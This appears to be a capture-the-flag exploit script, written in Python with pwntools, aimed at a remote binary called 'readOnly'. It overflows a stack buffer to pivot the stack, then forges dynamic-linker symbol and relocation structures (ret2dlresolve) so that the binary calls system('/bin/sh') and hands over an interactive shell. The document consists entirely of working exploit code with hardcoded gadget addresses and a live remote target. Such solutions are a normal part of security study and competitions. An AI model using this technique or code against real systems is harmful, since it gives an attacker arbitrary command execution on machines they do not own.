#!/usr/bin/python3

from pwn import *
import subprocess

context.binary = exe = ELF('./readOnly', checksec=False)
context.log_level = 'info'

# p = process('./readOnly')
p = remote('139.180.134.15', 7334)

############################
### Stage 1: Stack pivot ###
############################
pop_rdi = 0x0000000000401293
pop_rsi_r15 = 0x0000000000401291
leave_ret = 0x0000000000401208
rw_section = 0x00000000404a00

payload = b'A'*(56-8)
payload += flat(
	rw_section,
	pop_rsi_r15,
	rw_section,
	0,
	exe.plt['read'],
	leave_ret
	)
payload = payload.ljust(0x100, b'P')
p.send(payload)

####################################################
### Stage 2.1: Ret2dlresolve - Create structures ###
####################################################
# Set up structure
JMPREL = 0x4005b8
SYMTAB = 0x4003d0
STRTAB = 0x4004a8
dlresolve = 0x401020

SYMTAB_addr = 0x404a50
JMPREL_addr = 0x404a70
STRTAB_addr = 0x404a90
symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB

st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0
SYMTAB_struct = p32(st_name) \
	+ p8(st_info) \
	+ p8(st_other) \
	+ p16(st_shndx) \
	+ p64(st_value) \
	+ p64(st_size)

r_offset = 0x404b30
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = flat(r_offset, r_info, r_addend)

############################################
### Stage 2.2: Ret2dlresolve - Get shell ###
############################################
payload = flat(
	b'A'*8,
	pop_rsi_r15,
	0,
	0,
	pop_rdi,
	0x404a98,		# String /bin/sh
	dlresolve,
	reloc_arg,		# Reloc_arg
	0,
	0,
	SYMTAB_struct,
	0,
	JMPREL_struct,
	0,
	b'system\x00\x00',
	b'/bin/sh\x00'
	)
p.send(payload)

p.interactive()